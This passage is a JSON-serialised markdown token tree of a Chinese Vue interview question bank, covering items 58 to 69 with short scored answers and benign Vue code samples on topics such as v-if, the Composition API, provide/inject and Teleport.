类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"使用index 作为 key和没写基本上没区别，因为不管数组的顺序怎么颠倒，index 都是 0, 1, 2...这样排列，导致 Vue 会复用错误的旧子节点，做很多额外的工作。","text":"使用index 作为 key和没写基本上没区别，因为不管数组的顺序怎么颠倒，index 都是 0, 1, 2...这样排列，导致 Vue 会复用错误的旧子节点，做很多额外的工作。","tokens":[{"type":"text","raw":"使用index 作为 key和没写基本上没区别，因为不管数组的顺序怎么颠倒，index 都是 0, 1, 2...这样排列，导致 Vue 会复用错误的旧子节点，做很多额外的工作。","text":"使用index 作为 key和没写基本上没区别，因为不管数组的顺序怎么颠倒，index 都是 0, 1, 2...这样排列，导致 Vue 会复用错误的旧子节点，做很多额外的工作。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 59. 什么是Vue以及Vue的特点？\\n\\n","depth":2,"text":"59. 什么是Vue以及Vue的特点？","tokens":[{"type":"text","raw":"59. 什么是Vue以及Vue的特点？","text":"59. 什么是Vue以及Vue的特点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.","text":"Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.","tokens":[{"type":"text","raw":"Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.","text":"Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 60. SPA及其优缺点是什么？\\n\\n","depth":2,"text":"60. SPA及其优缺点是什么？","tokens":[{"type":"text","raw":"60. SPA及其优缺点是什么？","text":"60. SPA及其优缺点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.","text":"单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.","tokens":[{"type":"text","raw":"单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.","text":"单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 61. v-if 和 v-show 的区别是什么？\\n\\n","depth":2,"text":"61. v-if 和 v-show 的区别是什么？","tokens":[{"type":"text","raw":"61. v-if 和 v-show 的区别是什么？","text":"61. v-if 和 v-show 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"v-if 是真正的条件渲染，它会根据表达式的真假值来决定是否将元素添加到 DOM 中；而 v-show 则始终会渲染元素，只是通过 CSS 样式控制其可见性。因此，当条件频繁切换时，v-show 更高效，因为它避免了销毁和重建元素的过程。","text":"v-if 是真正的条件渲染，它会根据表达式的真假值来决定是否将元素添加到 DOM 中；而 v-show 则始终会渲染元素，只是通过 CSS 样式控制其可见性。因此，当条件频繁切换时，v-show 更高效，因为它避免了销毁和重建元素的过程。","tokens":[{"type":"text","raw":"v-if 是真正的条件渲染，它会根据表达式的真假值来决定是否将元素添加到 DOM 中；而 v-show 则始终会渲染元素，只是通过 CSS 样式控制其可见性。因此，当条件频繁切换时，v-show 更高效，因为它避免了销毁和重建元素的过程。","text":"v-if 是真正的条件渲染，它会根据表达式的真假值来决定是否将元素添加到 DOM 中；而 v-show 则始终会渲染元素，只是通过 CSS 样式控制其可见性。因此，当条件频繁切换时，v-show 更高效，因为它避免了销毁和重建元素的过程。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 62. 如何动态绑定 class 和 style？\\n\\n","depth":2,"text":"62. 如何动态绑定 class 和 style？","tokens":[{"type":"text","raw":"62. 如何动态绑定 class 和 style？","text":"62. 如何动态绑定 class 和 style？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"在 Vue 中，可以通过对象或数组的形式动态绑定 class 和 style。对于 class，如果样式个数和名字不确定，则适合使用对象写法；若样式确定但是否应用不确定，则适用数组写法。例如：","text":"在 Vue 中，可以通过对象或数组的形式动态绑定 class 和 style。对于 class，如果样式个数和名字不确定，则适合使用对象写法；若样式确定但是否应用不确定，则适用数组写法。例如：","tokens":[{"type":"text","raw":"在 Vue 中，可以通过对象或数组的形式动态绑定 class 和 style。对于 class，如果样式个数和名字不确定，则适合使用对象写法；若样式确定但是否应用不确定，则适用数组写法。例如：","text":"在 Vue 中，可以通过对象或数组的形式动态绑定 class 和 style。对于 class，如果样式个数和名字不确定，则适合使用对象写法；若样式确定但是否应用不确定，则适用数组写法。例如：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<div :class=\\"{ active: isActive, \'text-danger\': hasError }\\"></div>\\n<div :class=\\"[isActive ? \'active\' : \'\', errorClass]\\"></div>\\n<div :style=\\"{ color: activeColor, fontSize: fontSize + \'px\' }\\"></div>\\n<div :style=\\"[baseStyles, overridingStyles]\\"></div>\\n```","lang":"html","text":"<div :class=\\"{ active: isActive, \'text-danger\': hasError }\\"></div>\\n<div :class=\\"[isActive ? \'active\' : \'\', errorClass]\\"></div>\\n<div :style=\\"{ color: activeColor, fontSize: fontSize + \'px\' }\\"></div>\\n<div :style=\\"[baseStyles, overridingStyles]\\"></div>"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 63. Composition API 和 Options API 的区别是什么？\\n\\n","depth":2,"text":"63. Composition API 和 Options API 的区别是什么？","tokens":[{"type":"text","raw":"63. Composition API 和 Options API 的区别是什么？","text":"63. Composition API 和 Options API 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Composition API 允许开发者以函数的方式组织逻辑，使得逻辑更加集中，便于理解和维护。相比之下，Options API 将逻辑分散在不同的生命周期钩子和选项中，虽然结构清晰但对于大型项目来说可能不够灵活。Composition API 提供了更好的类型推断支持，并且更适合与 TypeScript 结合使用.","text":"Composition API 允许开发者以函数的方式组织逻辑，使得逻辑更加集中，便于理解和维护。相比之下，Options API 将逻辑分散在不同的生命周期钩子和选项中，虽然结构清晰但对于大型项目来说可能不够灵活。Composition API 提供了更好的类型推断支持，并且更适合与 TypeScript 结合使用.","tokens":[{"type":"text","raw":"Composition API 允许开发者以函数的方式组织逻辑，使得逻辑更加集中，便于理解和维护。相比之下，Options API 将逻辑分散在不同的生命周期钩子和选项中，虽然结构清晰但对于大型项目来说可能不够灵活。Composition API 提供了更好的类型推断支持，并且更适合与 TypeScript 结合使用.","text":"Composition API 允许开发者以函数的方式组织逻辑，使得逻辑更加集中，便于理解和维护。相比之下，Options API 将逻辑分散在不同的生命周期钩子和选项中，虽然结构清晰但对于大型项目来说可能不够灵活。Composition API 提供了更好的类型推断支持，并且更适合与 TypeScript 结合使用.","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 64. Vue 3 生命周期钩子有什么变化？\\n\\n","depth":2,"text":"64. Vue 3 生命周期钩子有什么变化？","tokens":[{"type":"text","raw":"64. Vue 3 生命周期钩子有什么变化？","text":"64. Vue 3 生命周期钩子有什么变化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Vue 3 的生命周期钩子与 Vue 2 类似，但有一些细微差别。例如，beforeCreate 和 created 钩子被 setup() 函数取代，后者在组件实例创建之前执行。其他钩子名称也有所调整，如 beforeDestroy 变为 beforeUnmount，destroyed 变为 unmounted。","text":"Vue 3 的生命周期钩子与 Vue 2 类似，但有一些细微差别。例如，beforeCreate 和 created 钩子被 setup() 函数取代，后者在组件实例创建之前执行。其他钩子名称也有所调整，如 beforeDestroy 变为 beforeUnmount，destroyed 变为 unmounted。","tokens":[{"type":"text","raw":"Vue 3 的生命周期钩子与 Vue 2 类似，但有一些细微差别。例如，beforeCreate 和 created 钩子被 setup() 函数取代，后者在组件实例创建之前执行。其他钩子名称也有所调整，如 beforeDestroy 变为 beforeUnmount，destroyed 变为 unmounted。","text":"Vue 3 的生命周期钩子与 Vue 2 类似，但有一些细微差别。例如，beforeCreate 和 created 钩子被 setup() 函数取代，后者在组件实例创建之前执行。其他钩子名称也有所调整，如 beforeDestroy 变为 beforeUnmount，destroyed 变为 unmounted。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 65. Vue 3 的主要新特性是什么？\\n\\n","depth":2,"text":"65. Vue 3 的主要新特性是什么？","tokens":[{"type":"text","raw":"65. Vue 3 的主要新特性是什么？","text":"65. Vue 3 的主要新特性是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Composition API：提供更灵活的代码组织方式。","text":"Composition API：提供更灵活的代码组织方式。","tokens":[{"type":"text","raw":"Composition API：提供更灵活的代码组织方式。","text":"Composition API：提供更灵活的代码组织方式。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"性能优化：使用 Proxy 实现响应式，性能更好。","text":"性能优化：使用 Proxy 实现响应式，性能更好。","tokens":[{"type":"text","raw":"性能优化：使用 Proxy 实现响应式，性能更好。","text":"性能优化：使用 Proxy 实现响应式，性能更好。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Tree-shaking：支持按需引入，减小打包体积。","text":"Tree-shaking：支持按需引入，减小打包体积。","tokens":[{"type":"text","raw":"Tree-shaking：支持按需引入，减小打包体积。","text":"Tree-shaking：支持按需引入，减小打包体积。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"TypeScript 支持：对 TypeScript 的支持更好。","text":"TypeScript 支持：对 TypeScript 的支持更好。","tokens":[{"type":"text","raw":"TypeScript 支持：对 TypeScript 的支持更好。","text":"TypeScript 支持：对 TypeScript 的支持更好。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Fragment、Teleport、Suspense：新增内置组件。","text":"Fragment、Teleport、Suspense：新增内置组件。","tokens":[{"type":"text","raw":"Fragment、Teleport、Suspense：新增内置组件。","text":"Fragment、Teleport、Suspense：新增内置组件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 66. 什么是 Composition API？\\n\\n","depth":2,"text":"66. 什么是 Composition API？","tokens":[{"type":"text","raw":"66. 什么是 Composition API？","text":"66. 什么是 Composition API？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Composition API 是 Vue 3 引入的新特性，允许将逻辑组织为可复用的函数。","text":"Composition API 是 Vue 3 引入的新特性，允许将逻辑组织为可复用的函数。","tokens":[{"type":"text","raw":"Composition API 是 Vue 3 引入的新特性，允许将逻辑组织为可复用的函数。","text":"Composition API 是 Vue 3 引入的新特性，允许将逻辑组织为可复用的函数。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { ref, computed } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = ref(0); // 定义响应式数据\\n    const doubleCount = computed(() => count.value * 2); // 计算属性\\n\\n    function increment() {\\n      count.value++; // 定义方法\\n    }\\n\\n    return { count, doubleCount, increment }; // 返回模板使用的数据和方法\\n  }\\n};\\n\\n```","lang":"js","text":"\\nimport { ref, computed } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = ref(0); // 定义响应式数据\\n    const doubleCount = computed(() => count.value * 2); // 计算属性\\n\\n    function increment() {\\n      count.value++; // 定义方法\\n    }\\n\\n    return { count, doubleCount, increment }; // 返回模板使用的数据和方法\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 67. Vue 3 中的 toRef 和 toRefs 是什么？\\n\\n","depth":2,"text":"67. Vue 3 中的 toRef 和 toRefs 是什么？","tokens":[{"type":"text","raw":"67. Vue 3 中的 toRef 和 toRefs 是什么？","text":"67. Vue 3 中的 toRef 和 toRefs 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"toRef：将对象的某个属性转换为 ref。","text":"toRef：将对象的某个属性转换为 ref。","tokens":[{"type":"text","raw":"toRef：将对象的某个属性转换为 ref。","text":"toRef：将对象的某个属性转换为 ref。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"toRefs：将整个响应式对象的所有属性转换为 ref。","text":"toRefs：将整个响应式对象的所有属性转换为 ref。","tokens":[{"type":"text","raw":"toRefs：将整个响应式对象的所有属性转换为 ref。","text":"toRefs：将整个响应式对象的所有属性转换为 ref。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { reactive, toRef, toRefs } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const state = reactive({ name: \'Vue 3\', age: 3 });\\n    const nameRef = toRef(state, \'name\'); // 单个属性\\n    const stateRefs = toRefs(state); // 所有属性\\n\\n    return { nameRef, stateRefs };\\n  }\\n};\\n\\n```","lang":"js","text":"\\nimport { reactive, toRef, toRefs } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const state = reactive({ name: \'Vue 3\', age: 3 });\\n    const nameRef = toRef(state, \'name\'); // 单个属性\\n    const stateRefs = toRefs(state); // 所有属性\\n\\n    return { nameRef, stateRefs };\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 68. Vue 3 中的 provide 和 inject 是什么？\\n\\n","depth":2,"text":"68. Vue 3 中的 provide 和 inject 是什么？","tokens":[{"type":"text","raw":"68. Vue 3 中的 provide 和 inject 是什么？","text":"68. Vue 3 中的 provide 和 inject 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"provide 和 inject 用于跨层级组件通信。","text":"provide 和 inject 用于跨层级组件通信。","tokens":[{"type":"text","raw":"provide 和 inject 用于跨层级组件通信。","text":"provide 和 inject 用于跨层级组件通信。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { provide, ref } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const message = ref(\'Hello from parent\');\\n    provide(\'message\', message); // 提供数据\\n  }\\n};\\n\\n// 子组件\\nimport { inject } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const message = inject(\'message\'); // 注入数据\\n    return { message };\\n  }\\n};\\n\\n```","lang":"js","text":"\\nimport { provide, ref } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const message = ref(\'Hello from parent\');\\n    provide(\'message\', message); // 提供数据\\n  }\\n};\\n\\n// 子组件\\nimport { inject } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const message = inject(\'message\'); // 注入数据\\n    return { message };\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 69. Vue 3 中的 Teleport 是什么？\\n\\n","depth":2,"text":"69. Vue 3 中的 Teleport 是什么？","tokens":[{"type":"text","raw":"69. Vue 3 中的 Teleport 是什么？","text":"69. Vue 3 中的 Teleport 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 